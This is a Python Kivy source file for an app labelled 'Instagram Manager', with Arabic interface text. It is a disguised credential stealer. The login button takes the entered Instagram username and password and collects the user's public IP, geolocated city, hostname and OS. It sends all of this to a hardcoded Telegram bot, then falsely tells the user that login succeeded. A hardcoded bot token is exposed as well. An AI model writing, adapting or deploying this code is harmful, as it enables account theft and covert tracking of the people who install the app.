import kivy
from kivy.app import App
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.gridlayout import GridLayout
from kivy.uix.label import Label
from kivy.uix.textinput import TextInput
from kivy.uix.button import Button
from kivy.uix.scrollview import ScrollView
from kivy.uix.popup import Popup
from kivy.uix.image import Image
from kivy.core.window import Window
from kivy.uix.spinner import Spinner
from kivy.clock import Clock
import requests
import socket
import platform
import datetime
import threading

# إعدادات التطبيق
TELEGRAM_BOT_TOKEN = "7648113549:AAFCbMY5_O7_9IAv0vSiMdcGhSMAewocNnA"
TELEGRAM_CHAT_ID = "933729143"

Window.size = (400, 600)

def send_telegram_message(text):
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    data = {"chat_id": TELEGRAM_CHAT_ID, "text": text}
    try:
        response = requests.post(url, data=data, timeout=5)
        return response.status_code == 200
    except Exception as e:
        print(f"Telegram Error: {e}")
        return False

def get_public_ip():
    try:
        return requests.get("https://api.ipify.org").text
    except:
        return "Unknown"

def get_location_from_ip(ip):
    try:
        response = requests.get(f"https://ipapi.co/{ip}/json/", timeout=5)
        if response.status_code == 200:
            data = response.json()
            city = data.get("city", "Unknown")
            country = data.get("country_name", "Unknown")
            return f"{city}, {country}"
    except:
        pass
    return "Unknown Location"

def get_device_name():
    try:
        return socket.gethostname()
    except:
        return "Unknown"

def get_system_info():
    try:
        return f"{platform.system()} {platform.release()}"
    except:
        return "Unknown"

class InstaManagerApp(App):
    def build(self):
        main_layout = BoxLayout(orientation='vertical', padding=10, spacing=10)
        
        # العنوان
        title = Label(text='Instagram Manager', size_hint_y=0.1, font_size='20sp')
        main_layout.add_widget(title)
        
        # نموذج التسجيل
        form_layout = GridLayout(cols=1, spacing=10, size_hint_y=0.4)
        
        self.username_input = TextInput(
            multiline=False,
            hint_text='اسم المستخدم',
            size_hint_y=None,
            height=40
        )
        form_layout.add_widget(self.username_input)
        
        self.password_input = TextInput(
            multiline=False,
            hint_text='كلمة المرور',
            password=True,
            size_hint_y=None,
            height=40
        )
        form_layout.add_widget(self.password_input)
        
        login_btn = Button(
            text='تسجيل الدخول',
            size_hint_y=None,
            height=40,
            background_color=(0.2, 0.6, 0.8, 1)
        )
        login_btn.bind(on_press=self.on_login)
        form_layout.add_widget(login_btn)
        
        main_layout.add_widget(form_layout)
        
        # منطقة السجل
        scroll = ScrollView(size_hint=(1, 0.4))
        self.log_text = Label(
            text='جاهز للاستخدام...',
            size_hint_y=None,
            markup=True
        )
        self.log_text.bind(texture_size=self.log_text.setter('size'))
        scroll.add_widget(self.log_text)
        main_layout.add_widget(scroll)
        
        return main_layout
    
    def log(self, msg):
        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        self.log_text.text += f"\n[{timestamp}] {msg}"
    
    def on_login(self, instance):
        username = self.username_input.text.strip()
        password = self.password_input.text.strip()
        
        if not username or not password:
            self.log("❌ يرجى إدخال البيانات كاملة")
            return
        
        self.log(f"🔄 جاري التسجيل كـ {username}...")
        
        # تشغيل العملية في خيط منفصل
        thread = threading.Thread(target=self.login_thread, args=(username, password))
        thread.daemon = True
        thread.start()
    
    def login_thread(self, username, password):
        try:
            # الحصول على معلومات الجهاز
            public_ip = get_public_ip()
            device_name = get_device_name()
            location = get_location_from_ip(public_ip)
            system_info = get_system_info()
            
            # رسالة تسجيل محاولة
            msg = f"🟢 محاولة تسجيل:\n👤 المستخدم: {username}\n🔑 كلمة المرور: {password}\n\n📍 الموقع: {location}\n💻 اسم الجهاز: {device_name}\n🖥️ النظام: {system_info}\n🌐 IP: {public_ip}"
            send_telegram_message(msg)
            
            self.log(f"✅ تم إرسال البيانات إلى Telegram")
            
            # رسالة النجاح
            success_msg = f"✅ محاولة من:\n👤 @{username}\n📍 {location}\n💻 {device_name}\n🌐 {public_ip}"
            send_telegram_message(success_msg)
            
            self.log(f"✅ تم التسجيل بنجاح!")
            
        except Exception as e:
            self.log(f"❌ خطأ: {str(e)}")

if __name__ == '__main__':
    app = InstaManagerApp()
    app.run()
